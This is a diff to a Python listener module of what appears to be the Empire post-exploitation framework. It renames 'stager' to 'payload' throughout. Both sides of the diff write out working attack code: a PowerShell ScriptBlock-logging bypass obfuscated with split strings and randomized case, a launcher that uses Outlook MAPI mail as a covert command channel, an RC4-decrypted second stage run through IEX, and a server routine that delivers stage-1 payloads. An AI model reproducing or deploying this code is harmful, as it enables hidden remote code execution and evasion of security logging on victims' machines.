@@ -33,7 +33,7 @@ class Listener:
             'Comments': ['This requires the Liniaal agent to translate messages from MAPI to HTTP. More info: https://github.com/sensepost/liniaal']
         }
 
-        # any options needed by the stager, settable during runtime
+        # any options needed by the payload, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
@@ -163,7 +163,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', payloadRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -184,82 +184,82 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
+                payload = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+                    payload = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+                    payload += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    payload += "'System.Management.Automation.Utils'"
+                    payload += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    payload += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    payload += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    payload += "['ScriptB'+'lockLogging']"
+                    payload += helpers.randomize_capitalization("){$GPC")
+                    payload += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    payload += helpers.randomize_capitalization("$GPC")
+                    payload += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    payload += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    payload += "('EnableScriptB'+'lockLogging',0);"
+                    payload += helpers.randomize_capitalization("$val.Add")
+                    payload += "('EnableScriptBlockInvocationLogging',0);"
+                    payload += helpers.randomize_capitalization("$GPC")
+                    payload += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    payload += helpers.randomize_capitalization("=$val}")
+                    payload += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    payload += "'signatures','N'+'onPublic,Static'"
+                    payload += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
-                    stager += "$outlook = New-Object -comobject Outlook.Application;"
-                    stager += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
-                    stager += 'MAPI");'
+                    payload += helpers.randomize_capitalization('Add-Type -assembly "Microsoft.Office.Interop.Outlook";')
+                    payload += "$outlook = New-Object -comobject Outlook.Application;"
+                    payload += helpers.randomize_capitalization('$mapi = $Outlook.GetNameSpace("')
+                    payload += 'MAPI");'
                     if listenerOptions['Email']['Value'] != '':
-                        stager += '$fld = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
-                        stager += '$fldel = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
+                        payload += '$fld = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(2).Folders.Item("'+listenerOptions['Folder']['Value']+'")};'
+                        payload += '$fldel = $outlook.Session.Folders | Where-Object {$_.Name -eq "'+listenerOptions['Email']['Value']+'"} | %{$_.Folders.Item(3)};'
                     else:
-                        stager += '$fld = $outlook.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
-                        stager += '$fldel = $outlook.Session.GetDefaultFolder(3);'
+                        payload += '$fld = $outlook.Session.GetDefaultFolder(6).Folders.Item("'+listenerOptions['Folder']['Value']+'");'
+                        payload += '$fldel = $outlook.Session.GetDefaultFolder(3);'
                 # clear out all existing mails/messages
 
-                stager += helpers.randomize_capitalization("while(($fld.Items | measure | %{$_.Count}) -gt 0 ){ $fld.Items | %{$_.delete()};}")
+                payload += helpers.randomize_capitalization("while(($fld.Items | measure | %{$_.Count}) -gt 0 ){ $fld.Items | %{$_.delete()};}")
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
-                stager += "'%s');" % (stagingKey)
+                payload += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
+                payload += "'%s');" % (stagingKey)
 
-                # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                # this is the minimized RC4 payload code from rc4.ps1
+                payload += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
                 # add the RC4 packet to a cookie
-                stager += helpers.randomize_capitalization('$mail = $outlook.CreateItem(0);$mail.Subject = "')
-                stager += 'mailpireout";'
-                stager += helpers.randomize_capitalization('$mail.Body = ')
-                stager += '"STAGE - %s"' % b64RoutingPacket
-                stager += helpers.randomize_capitalization(';$mail.save() | out-null;')
-                stager += helpers.randomize_capitalization('$mail.Move($fld)| out-null;')
-                stager += helpers.randomize_capitalization('$break = $False; $data = "";')
-                stager += helpers.randomize_capitalization("While ($break -ne $True){")
-                stager += helpers.randomize_capitalization('$fld.Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;')
-                stager += helpers.randomize_capitalization('$fld.Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $data=[System.Convert]::FromBase64String($_.Body);$_.Delete();};}')
+                payload += helpers.randomize_capitalization('$mail = $outlook.CreateItem(0);$mail.Subject = "')
+                payload += 'mailpireout";'
+                payload += helpers.randomize_capitalization('$mail.Body = ')
+                payload += '"STAGE - %s"' % b64RoutingPacket
+                payload += helpers.randomize_capitalization(';$mail.save() | out-null;')
+                payload += helpers.randomize_capitalization('$mail.Move($fld)| out-null;')
+                payload += helpers.randomize_capitalization('$break = $False; $data = "";')
+                payload += helpers.randomize_capitalization("While ($break -ne $True){")
+                payload += helpers.randomize_capitalization('$fld.Items | Where-Object {$_.Subject -eq "mailpirein"} | %{$_.HTMLBody | out-null} ;')
+                payload += helpers.randomize_capitalization('$fld.Items | Where-Object {$_.Subject -eq "mailpirein" -and $_.DownloadState -eq 1} | %{$break=$True; $data=[System.Convert]::FromBase64String($_.Body);$_.Delete();};}')
 
-                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
+                payload += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+                payload += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
-                # base64 encode the stager and return it
+                    payload = helpers.obfuscate(self.mainMenu.installPath, payload, obfuscationCommand=obfuscationCommand)
+                # base64 encode the payload and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
-                    return helpers.powershell_launcher(stager, launcher)
+                    return helpers.powershell_launcher(payload, launcher)
                 else:
-                    # otherwise return the case-randomized stager
-                    return stager
+                    # otherwise return the case-randomized payload
+                    return payload
             else:
                 print helpers.color("[!] listeners/http_mapi generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module.")
 
@@ -267,13 +267,13 @@ class Listener:
             print helpers.color("[!] listeners/http_mapi generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language="powershell"):
+    def generate_payload(self, listenerOptions, encode=False, encrypt=True, language="powershell"):
         """
-        Generate the stager code needed for communications with this listener.
+        Generate the payload code needed for communications with this listener.
         """
 
         #if not language:
-        #    print helpers.color('[!] listeners/http_mapi generate_stager(): no language specified!')
+        #    print helpers.color('[!] listeners/http_mapi generate_payload(): no language specified!')
         #    return None
 
         profile = listenerOptions['DefaultProfile']['Value']
@@ -285,9 +285,9 @@ class Listener:
 
         if language.lower() == 'powershell':
 
-            # read in the stager base
-            f = open("%s/data/agent/stagers/http_mapi.ps1" % (self.mainMenu.installPath))
-            stager = f.read()
+            # read in the payload base
+            f = open("%s/data/agent/payloads/http_mapi.ps1" % (self.mainMenu.installPath))
+            payload = f.read()
             f.close()
 
             # make sure the server ends with "/"
@@ -295,36 +295,36 @@ class Listener:
                 host += "/"
 
             # patch the server and key information
-            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('REPLACE_FOLDER', folder)
+            payload = payload.replace('REPLACE_STAGING_KEY', stagingKey)
+            payload = payload.replace('REPLACE_FOLDER', folder)
 
             # patch in working hours if any
             if workingHours != "":
-                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
+                payload = payload.replace('WORKING_HOURS_REPLACE', workingHours)
 
-            randomizedStager = ''
+            randomizedpayload = ''
 
-            for line in stager.split("\n"):
+            for line in payload.split("\n"):
                 line = line.strip()
                 # skip commented line
                 if not line.startswith("#"):
                     # randomize capitalization of lines without quoted strings
                     if "\"" not in line:
-                        randomizedStager += helpers.randomize_capitalization(line)
+                        randomizedpayload += helpers.randomize_capitalization(line)
                     else:
-                        randomizedStager += line
+                        randomizedpayload += line
 
-            # base64 encode the stager and return it
+            # base64 encode the payload and return it
             if encode:
-                return helpers.enc_powershell(randomizedStager)
+                return helpers.enc_powershell(randomizedpayload)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
+                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedpayload)
             else:
-                # otherwise just return the case-randomized stager
-                return randomizedStager
+                # otherwise just return the case-randomized payload
+                return randomizedpayload
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' is currently supported for this module.")
+            print helpers.color("[!] listeners/http generate_payload(): invalid language specification, only 'powershell' is currently supported for this module.")
 
 
     def generate_agent(self, listenerOptions, language=None):
@@ -476,7 +476,7 @@ class Listener:
         Threaded function that actually starts up the Flask server.
         """
 
-        # make a copy of the currently set listener options for later stager/agent generation
+        # make a copy of the currently set listener options for later payload/agent generation
         listenerOptions = copy.deepcopy(listenerOptions)
 
         # suppress the normal Flask output
@@ -543,11 +543,11 @@ class Listener:
                     for (language, results) in dataResults:
                         if results:
                             if results == 'STAGE0':
-                                # handle_agent_data() signals that the listener should return the stager.ps1 code
+                                # handle_agent_data() signals that the listener should return the payload.ps1 code
 
-                                # step 2 of negotiation -> return stager.ps1 (stage 1)
-                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
+                                # step 2 of negotiation -> return payload.ps1 (stage 1)
+                                dispatcher.send("[*] Sending %s payload (stage 1) to %s" % (language, clientIP), sender='listeners/http')
+                                stage = self.generate_payload(language=language, listenerOptions=listenerOptions)
                                 return make_response(stage, 200)
 
                             elif results.startswith('ERROR:'):
